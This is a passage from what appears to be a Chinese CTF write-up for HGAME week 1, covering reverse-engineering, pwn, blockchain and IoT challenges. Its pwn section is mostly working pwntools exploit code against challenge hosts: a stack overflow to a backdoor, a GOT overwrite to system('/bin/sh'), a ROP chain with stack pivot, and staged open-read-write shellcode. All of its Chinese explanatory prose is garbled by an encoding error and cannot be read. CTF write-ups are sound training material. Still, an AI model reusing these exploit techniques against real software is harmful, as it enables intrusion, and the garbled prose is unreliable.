èƒ½å¸®å¸®ä»–å—ï¼Ÿ</p></blockquote><p>ä»£ç é€»è¾‘ä¸ºå°†ä½4ä½å’Œé«˜4ä½åˆ†åˆ«å–å‡ºå­˜å…¥ <code>v4[2*i]</code> å’Œ <code>v4[2*i+1]</code>ï¼Œæå–æ¯”å¯¹å­—ç¬¦ä¸² <code>dword_403000</code>ï¼Œé€†å‘è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>((c[<span class="number">2</span>*i+<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + c[<span class="number">2</span>*i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>pwnç­¾åˆ°ï¼Œç›´æ¥ <code>cat flag</code> å¾—flagã€‚</p><p>â€‹    </p><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>ç®€å•æ ˆæº¢å‡ºåˆ° <code>b4ckd0or()</code> å‡½æ•°ä¸Šï¼Œç‰¹åˆ«çš„ä¸€ç‚¹æ˜¯ç”¨ <code>close(1)</code> å…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œå¯ä»¥ç”¨ <code>execv 1&gt;&amp;0</code> å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œå› ä¸ºé»˜è®¤æ‰“å¼€ä¸€ä¸ªç»ˆç«¯åï¼Œ0/1/2éƒ½æŒ‡å‘åŒä¸€ä¸ªä½ç½®ä¹Ÿå°±æ˜¯å½“å‰ç»ˆç«¯ï¼Œæ‰€ä»¥è¿™æ¡è¯­å¥ç›¸å½“äºé‡å¯äº†æ ‡å‡†è¾“å‡ºï¼Œæ­¤æ—¶å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤å¹¶ä¸”çœ‹å¾—åˆ°è¾“å‡ºäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31066</span>)</span><br><span class="line"></span><br><span class="line">b4ckd0or=<span class="number">0x401176</span></span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(b4ckd0or)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><blockquote><p>å…”å…”åœ¨ä¹°é«˜é“ç¥¨æ—¶æƒ³è¦é€‰ä¸€ä¸ªå¥½åº§ä½ã€‚</p><p>HINTS:</p><p>æ•°ç»„ä¸‹æ ‡çš„æ£€æŸ¥å¥½åƒå°‘äº†ç‚¹ä¸œè¥¿</p></blockquote><p>ç”±ä»£ç é€»è¾‘çŸ¥å¯ä»¥å†™å…¥bssæ®µï¼Œåªé™åˆ¶äº†ä¸Šé™æœªé™åˆ¶ä¸‹é™ï¼Œä½¿ç”¨è´Ÿæ•°å¯æ‰“GOTè¡¨å†…å®¹ã€‚è¦†ç›– <code>exit()</code> çš„GOTè¡¨ä¸º <code>main()</code> ä½¿ç¨‹åºå¾ªç¯ï¼Œå†è¦†ç›– <code>puts()</code> çš„GOTè¡¨æ³„éœ² <code>puts()</code> åœ°å€è®¡ç®—å¾—åˆ°libcåŸºåœ°å€ï¼Œæœ€åè¦†ç›– <code>puts()</code> çš„GOTè¡¨ä¸º <code>system(&quot;/bin/sh\x00&quot;)</code>ã€‚ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30831</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=elf.sym.main</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-6&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(p64(main))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-9&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base=puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;choose one.\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-9&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(base+libc.sym.system))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><blockquote><p>HINTS:</p><p>æ ‡é¢˜å°±æ˜¯è€ƒç‚¹æï¼Œæ²¡æ€è·¯çš„å¯ä»¥æŒ‰ç…§æ ‡é¢˜æŸ¥ä¸€æŸ¥</p><p>è§‰å¾—æº¢å‡ºçš„ä¸å¤Ÿå¤šï¼Ÿé‚£å°±å…ˆæ‰¾ä¸ªåœ°æ–¹æŠŠROPé“¾å†™è¿›å»ï¼Œå†æŠŠæ ˆè¿ç§»è¿‡å»æ‰§è¡Œå§</p></blockquote><p>æ ‡é¢˜è¡¨æ˜éœ€orwï¼Œä½†å¼€å¯äº†æ²™ç›’ç¦ç”¨äº† <code>execve()/execveat()</code>ï¼Œ<code>read()</code> è¯»çš„å­—èŠ‚æ•°è¶³ä»¥ç”¨ROPé“¾æ³„éœ²libcï¼Œä½†æº¢å‡ºå­—èŠ‚0x28ä¸è¶³ä»¥æ‰§è¡Œorwï¼Œéœ€å…ˆåšæ ˆè¿ç§»åï¼Œå†æ‰§è¡Œorwã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">30153</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">main=elf.sym.main</span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(elf.sym.main)</span><br><span class="line">r.send(pl)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">base=leak-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">libc.address=base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findGadget</span>(<span class="params">gadget</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span>(libc.search(asm(gadget),executable=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">bss_rop=<span class="number">0x404048</span></span><br><span class="line">bss_flag=<span class="number">0x404038</span></span><br><span class="line">leave_ret=<span class="number">0x4012EE</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(libc.sym.read)+p64(leave_ret)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_flag)+p64(libc.sym.read)</span><br><span class="line">pl+=p64(pop_rdi)+p64(bss_flag)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(<span class="number">0</span>)+p64(libc.sym.<span class="built_in">open</span>) <span class="comment"># fd=open(&#x27;./flag&#x27;,0)  #3</span></span><br><span class="line">pl+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rdx;ret&#x27;</span>))+p64(<span class="number">0x30</span>)+p64(libc.sym.read) <span class="comment"># read(3,buf,0x100)</span></span><br><span class="line">pl+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rdx;ret&#x27;</span>))+p64(<span class="number">0x30</span>)+p64(libc.sym.write) <span class="comment"># puts(buf)</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><blockquote><p>HINTS:</p><p>ä¸€æ¬¡readä¸å¤Ÿå¤šï¼Œä¸ºä»€ä¹ˆä¸å†è¯»ä¸€æ¬¡å‘¢ï¼Ÿ</p></blockquote><p>åˆçœ‹ä»£ç åƒret2shellcodeï¼Œä½†å¼€å¯äº†æ²™ç›’ç¦ç”¨äº† <code>execve()/execveat()</code>ï¼Œè€Œä¸” <code>read()</code> åªèƒ½è¯»å…¥0x10å­—èŠ‚ã€‚</p><p>éœ€è¦å†™å…¥shellcodeï¼Œä½†éœ€å…ˆè°ƒç”¨ä¸€æ¬¡ <code>read()</code> ä»¥è¯»å–æ›´å¤šçš„å­—èŠ‚ï¼Œå†æ‰§è¡Œorwå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31331</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov rdx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">pl = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">pl += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl = asm(pl)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>))))</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf</span>+pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><blockquote><p>é¢˜ç›®ä¸­ç»™å‡ºäº†ä¸‰ä¸ªç«¯å£ï¼Œåˆ†åˆ«æ˜¯ RPCã€æ°´é¾™å¤´ã€é¢˜ç›®äº¤äº’ç«¯ã€‚ ç”±äºé¶æœºç«¯å£éšæœºï¼Œéœ€è¦é€‰æ‰‹è‡ªè¡Œå°è¯•ã€‚</p><p>å…¶ä¸­ï¼Œæµè§ˆå™¨å¯ç›´æ¥è®¿é—®çš„æ˜¯æ°´é¾™å¤´ï¼Œæµè§ˆå™¨ç›´æ¥è®¿é—®æŠ¥ 403 çš„æ˜¯ RPCï¼Œæµè§ˆå™¨æ— æ³•è®¿é—®çš„æ˜¯é¢˜ç›®äº¤äº’ç«¯ï¼Œéœ€ä½¿ç”¨ nc è¿æ¥ã€‚</p></blockquote><p>ncè¿æ¥ï¼Œé€‰1ç”Ÿæˆè´¦å·ï¼Œåœ¨æ°´é¾™å¤´é‡Œè½¬è´¦åï¼Œé€‰2ç”Ÿæˆåˆçº¦åœ°å€ï¼Œé€‰4æŸ¥çœ‹æºç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// contracts/checkin.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract Checkin &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting)  &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        string memory expected = &quot;HelloHGAME!&quot;;</span><br><span class="line">        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç é€»è¾‘ä¸ºé€šè¿‡ <code>setGreeting()</code> ä¼ å…¥å­—ç¬¦ä¸²ä½¿å¾— <code>isSolved()</code> è¿”å› <code>true</code>ï¼Œä¼ å…¥çš„å­—ç¬¦ä¸²ä¸º <code>HelloHGAME!</code> å³æ»¡è¶³æ¡ä»¶ã€‚</p><p>å°è¯•åœ¨Remixä¸­æ”»å‡»å·²ç”Ÿæˆçš„åˆçº¦åœ°å€æ²¡æ‰“é€šï¼Œé—®å‡ºé¢˜äººçŸ¥å¯¹Remixç¯å¢ƒåšäº†é™åˆ¶ï¼ˆé˜²ä½œå¼Šï¼‰ï¼Œéœ€é‡‡ç”¨web3pyè„šæœ¬æ–¹å¼è¿›è¡Œæ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># RPCç½‘ç»œç¯å¢ƒ</span></span><br><span class="line">rpc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">w3 = Web3(HTTPProvider(rpc))</span><br><span class="line"><span class="comment"># æ£€æµ‹è¿é€šæ€§</span></span><br><span class="line"><span class="built_in">print</span>(w3.isConnected())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Metamaskåœ°å€</span></span><br><span class="line">myAccount = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åˆçº¦åœ°å€</span></span><br><span class="line">contractAddress = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># Metamaskç§é’¥</span></span><br><span class="line">private_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># abiåœ¨Remixä¸Šç¼–è¯‘.solæºç åè·å–</span></span><br><span class="line">abi = json.loads(<span class="string">&#x27;[&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;greet&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;isSolved&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;bool&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;bool&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;name&quot;: &quot;setGreeting&quot;,&quot;outputs&quot;: [],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–åˆçº¦</span></span><br><span class="line">contract = w3.eth.contract(address=contractAddress, abi=abi)</span><br><span class="line">nonce = w3.eth.getTransactionCount(Web3.toChecksumAddress(myAccount))</span><br><span class="line"><span class="comment"># åˆçº¦äº¤æ˜“å®šä¹‰ï¼Œè°ƒç”¨å‡½æ•°setGreeting</span></span><br><span class="line"><span class="comment"># äº‹å…ˆä¿è¯myAccountæœ‰è¶³å¤Ÿetheræ”¯ä»˜gas*gasPrice+valueï¼Œä»æ°´é¾™å¤´è·å–ether</span></span><br><span class="line">tx = contract.functions.setGreeting(<span class="string">&#x27;HelloHGAME!&#x27;</span>).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: Web3.toChecksumAddress(myAccount),</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.eth.gasPrice,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">gas = w3.eth.estimate_gas(tx)</span><br><span class="line">tx[<span class="string">&#x27;gas&#x27;</span>] = gas</span><br><span class="line"><span class="built_in">print</span>(tx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># äº¤æ˜“æ‰§è¡Œ</span></span><br><span class="line">signed_txn = w3.eth.account.signTransaction(tx, private_key)</span><br><span class="line"><span class="built_in">print</span>(signed_txn.<span class="built_in">hash</span>)</span><br><span class="line"><span class="built_in">print</span>(signed_txn.rawTransaction)</span><br><span class="line"></span><br><span class="line">tmp =  w3.eth.sendRawTransaction(signed_txn.rawTransaction.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>æœ€åncè¿æ¥ï¼Œé€‰4è·å–flagã€‚</p><p>â€‹    </p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Help-marvin"><a href="#Help-marvin" class="headerlink" title="Help marvin"></a>Help marvin</h3><blockquote><p>å…”å…”å‘ç°å”®ç¥¨çš„marvinåªä¼šåå‡ºä¸‰ä¸ªç™½å¤´ å†³å®šå»ä¿®ä¸€ä¿®marvin(-30)</p><p>HINTS:</p><p>Hint: SPI</p></blockquote><p>ç»™å®šçš„æ˜¯sræ–‡ä»¶ï¼Œè§£å‹ï¼Œæ ¹æ®æ–‡ä»¶å†…å®¹æœç´¢çŸ¥ä¸ºé€»è¾‘åˆ†æå¥—ä»¶sigrokç”Ÿæˆçš„æ–‡ä»¶ã€‚</p><p>ä½¿ç”¨PulseViewå·¥å…·æ‰“å¼€sræ–‡ä»¶ï¼Œåœ¨D0/D1/D2æœ‰æ•°æ®ï¼Œå‚è€ƒ <a href="https://blog.csdn.net/qq_42880719/article/details/123763744">2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ› Whatâ€™s In The Bits</a> ä»¥åŠåæ”¾çš„æç¤ºï¼ŒçŸ¥ç¬¦åˆSPIåè®®ç‰¹å¾ã€‚</p><p>é€‰æ‹©SPIè§£ç å™¨ï¼Œclocké€‰D0ï¼Œè¾“å…¥é€‰D2ï¼Œå¯¼å‡ºæ‰€æœ‰è§£ç çš„01å­—ç¬¦ï¼š</p><p><code>00110100001100111011000010110110101100101011110110011010001011111001101010111010000110100011011100110011101100101010111110101001101110000001100010111110</code></p><p>å»æ‰å¤´ä½0ï¼Œ8ä½ä¸€ç»„å¯è¿˜åŸå­—ç¬¦ä¸² <code>hgame&#123;4_5t4nge_Sp1&gt;</code>ï¼Œä¿®æ­£æœ€åä¸€ä½è¡¥è¶³ä¸€ä½1ï¼Œå¾— <code>hgame&#123;4_5t4nge_Sp1&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Help-the-uncle-who-canâ€™t-jump-twice"><a href="#Help-the-uncle-who-canâ€™t-jump-twice" class="headerlink" title="Help the uncle who canâ€™t jump twice"></a>Help the uncle who canâ€™t jump 